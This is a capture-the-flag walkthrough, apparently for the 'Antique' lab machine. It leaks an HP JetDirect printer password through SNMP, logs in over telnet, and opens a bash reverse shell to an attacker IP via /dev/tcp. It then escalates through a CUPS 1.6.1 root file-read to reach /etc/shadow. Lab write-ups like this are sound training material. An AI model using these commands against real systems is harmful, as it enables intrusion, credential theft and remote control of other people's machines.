# Antique
## Information Gathering
10.10.11.107

#### Ports/Services
23/tcp   telnet?

## Enumeration
### Nmap scan
```bash
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
```

### 23/tcp
- Banner grabbing

```bash
telnet 10.10.11.107

HP JetDirect
```

- Attempting to grab cleartext password
```bash
snmpget -v1 -c public 10.10.11.107 iso.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
```

- Converting `50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135` to ASCII `P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5`
- You can use the first part to login to the printer `P@ssw0rd@123!!123`
- Login to printer using the previous password
- You are able to run system commands using `exec`
- Reverse shell `exec bash -c 'bash -i >& /dev/tcp/10.10.14.17/53 0>&1'`

## Exploitation
After logging in with the leaked credentials you can run system commands. Start your nc listener and throw a reverse shell.
```bash
exec bash -c 'bash -i >& /dev/tcp/10.10.14.17/53 0>&1'
```

## Privilege Escalation
- An internal port is listening on 631
```bash
netstat -antup 

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1029/python3        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp       44      0 10.10.11.107:23         10.10.14.17:54550       CLOSE_WAIT  1029/python3        
tcp        0      0 10.10.11.107:23         10.10.14.17:55386       ESTABLISHED 1029/python3        
tcp        0    286 10.10.11.107:33726      10.10.14.17:53          ESTABLISHED 1277/bash           
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
udp        0      0 10.10.11.107:53573      8.8.8.8:53              ESTABLISHED -                   
udp        0      0 0.0.0.0:161             0.0.0.0:*                           -
```
- This is most likely Internet Printing Protocol (IPP)
- Root is running this process
```bash
ps aux | grep "cups"
root        1028  0.0  0.0  20392  3428 ?        Ss   20:38   0:00 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
```
- Interacting with this process gives an HTTP response which contains the version
```bash
nc 127.0.0.1 631
whoami

<TITLE>Bad Request - CUPS v1.6.1</TITLE>
```
- CUPS 1.6.1
	- [Root file read](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/)
- You can use this exploit to read /etc/shadow and get the root flag.